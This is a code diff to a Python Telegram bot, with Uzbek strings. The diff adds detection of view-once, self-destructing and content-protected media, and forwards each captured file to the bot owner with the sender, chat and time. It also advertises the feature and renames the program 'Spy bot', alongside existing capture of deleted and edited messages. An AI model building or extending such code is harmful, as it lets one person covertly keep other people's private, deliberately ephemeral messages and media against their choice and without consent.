@@ -40,6 +40,20 @@ def extract_media(message):
         return "video_note", message.video_note.file_id
     return None, None
 
+def is_disappearing(message):
+    """O'chib ketuvchi media tekshirish"""
+    try:
+        if message.photo and message.has_protected_content:
+            return True
+        if hasattr(message, 'self_destruct_time') and message.self_destruct_time:
+            return True
+        # view_once tekshirish
+        if hasattr(message, 'media') and hasattr(message.media, 'ttl_seconds'):
+            return message.media.ttl_seconds is not None
+    except:
+        pass
+    return False
+
 def send_media_to_owner(media_type, file_id, caption):
     try:
         if media_type == "photo":
@@ -75,6 +89,26 @@ def save_any_message(message):
     }
     store(message.chat.id, message.message_id, data)
     return data
+
+def handle_disappearing(message, prefix=""):
+    """O'chib ketuvchi mediani owner ga yuborish"""
+    media_type, file_id = extract_media(message)
+    sender = get_sender(message)
+    chat_title = get_chat_name(message)
+    time_now = datetime.now().strftime("%H:%M:%S")
+
+    caption = (
+        f"👁 <b>{prefix}O'chib ketuvchi media!</b>\n"
+        f"👤 <b>Kim:</b> {sender}\n"
+        f"💬 <b>Chat:</b> {chat_title}\n"
+        f"🕐 <b>Vaqt:</b> {time_now}\n"
+        f"📁 <b>Tur:</b> {media_type or 'Noma\\'lum'}"
+    )
+
+    if file_id:
+        send_media_to_owner(media_type, file_id, caption)
+    else:
+        bot.send_message(OWNER_ID, caption, parse_mode="HTML")
 
 
 # ── Obuna tekshirish ─────────────────────────────────────────────────────────
@@ -112,6 +146,7 @@ def on_start(message):
     markup = types.InlineKeyboardMarkup(row_width=1)
     markup.add(
         types.InlineKeyboardButton("📢 Kanal", url="https://t.me/umarjonovs"),
+        types.InlineKeyboardButton("🔗 Profilga ulash yo'riqnomasi", url="https://t.me/umarjonovs"),
     )
 
     bot.send_message(
@@ -120,6 +155,7 @@ def on_start(message):
         f"🤖 Bu bot sizning Telegram profilingizga ulanib, quyidagi imkoniyatlarni beradi:\n\n"
         f"🗑 <b>O'chirilgan xabarlar</b> — kimdir xabar o'chirsa, siz ko'rasiz\n"
         f"✏️ <b>Tahrirlangan xabarlar</b> — eski va yangi versiyasini ko'rasiz\n"
+        f"👁 <b>O'chib ketuvchi media</b> — bir marta ko'riladigan rasm/video saqlanadi\n"
         f"🤖 <b>AI avtomatik javob</b> — siz yo'q paytda sun'iy intellekt javob beradi\n\n"
         f"⚙️ <b>Profilga ulash tartibi:</b>\n"
         f"1️⃣ Telegram → <b>Settings</b>\n"
@@ -144,7 +180,7 @@ def on_check_sub(call):
         bot.answer_callback_query(call.id, "❌ Siz hali obuna bo'lmadingiz!", show_alert=True)
 
 
-# ── Oddiy xabarlar (saqlash, AI yo'q) ───────────────────────────────────────
+# ── Oddiy xabarlar ───────────────────────────────────────────────────────────
 
 @bot.message_handler(content_types=[
     'text', 'photo', 'video', 'audio', 'voice',
@@ -155,6 +191,11 @@ def on_message(message):
         return
 
     if not check_sub(message):
+        return
+
+    # O'chib ketuvchi media tekshirish
+    if is_disappearing(message):
+        handle_disappearing(message)
         return
 
     save_any_message(message)
@@ -193,13 +234,18 @@ def on_edited(message):
         store(chat_id, message.message_id, old)
 
 
-# ── Business xabarlar (faqat OWNER uchun AI) ────────────────────────────────
+# ── Business xabarlar ────────────────────────────────────────────────────────
 
 @bot.business_message_handler(content_types=[
     'text', 'photo', 'video', 'audio', 'voice',
     'document', 'sticker', 'video_note'
 ])
 def on_business_message(message):
+    # O'chib ketuvchi media tekshirish
+    if is_disappearing(message):
+        handle_disappearing(message, prefix="Business | ")
+        return
+
     save_any_message(message)
 
     if message.text:
@@ -231,7 +277,7 @@ def on_business_edited(message):
     media_type, file_id = extract_media(message)
 
     report = (
-        f"✏️ <b>Xabar tahrirlandi</b>\n"
+        f"✏️ <b>Business xabar tahrirlandi</b>\n"
         f"👤 <b>Kim:</b> {get_sender(message)}\n"
         f"🕐 <b>Vaqt:</b> {time_now}\n\n"
         f"📌 <b>Eski matn:</b>\n{old_text}\n\n"
@@ -290,7 +336,7 @@ def on_reset(message):
 
 def main():
     keep_alive()
-    bot.send_message(OWNER_ID, "✅ <b>Josus bot ishga tushdi!</b>", parse_mode="HTML")
+    bot.send_message(OWNER_ID, "✅ <b>Spy bot ishga tushdi!</b>", parse_mode="HTML")
     print("✅ Bot ishga tushdi!")
     bot.infinity_polling()
 
